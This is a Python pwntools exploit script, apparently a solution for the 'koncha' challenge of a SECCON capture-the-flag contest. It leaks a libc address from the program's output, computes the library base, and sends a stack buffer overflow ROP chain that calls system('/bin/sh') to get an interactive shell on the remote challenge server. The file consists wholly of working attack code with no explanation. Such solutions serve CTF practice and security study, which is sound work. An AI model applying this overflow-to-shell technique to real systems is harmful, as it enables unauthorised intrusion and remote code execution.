#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "chall.ptc"
#FILE_NAME = "chall"

#"""
HOST = "koncha.seccon.games"
PORT = 9001 
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
#
libc = ELF('./lib/libc.so.6')
off_binsh = next(libc.search(b"/bin/sh"))
off_system = libc.symbols["system"]
off_dust = 0x7ffff7fc82e8 - 0x7ffff7dd7000
off_rdi_ret = 0x23b6a
off_only_ret = 0x23b6a+1

def align2qword(s):
	if len(s) > 8:
		print("[ERROR] align2qword: argument larger than 8bytes")
		exit()
	return u64(s+b'\x00'*(8-len(s)))

def exploit():
	# rbp-0x30
	
	conn.sendlineafter("?\n", "")
	conn.recvuntil(", ")
	libc_dust = align2qword(conn.recvuntil("!")[:-1])
	libc_base = libc_dust - off_dust
	print(hex(libc_dust))
	print(hex(libc_base))
	
	payload = b"A"*0x58
	payload += p64(libc_base+off_only_ret)
	payload += p64(libc_base+off_rdi_ret)
	payload += p64(libc_base+off_binsh)
	payload += p64(libc_base+off_system)
	conn.sendlineafter("?\n", payload);
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
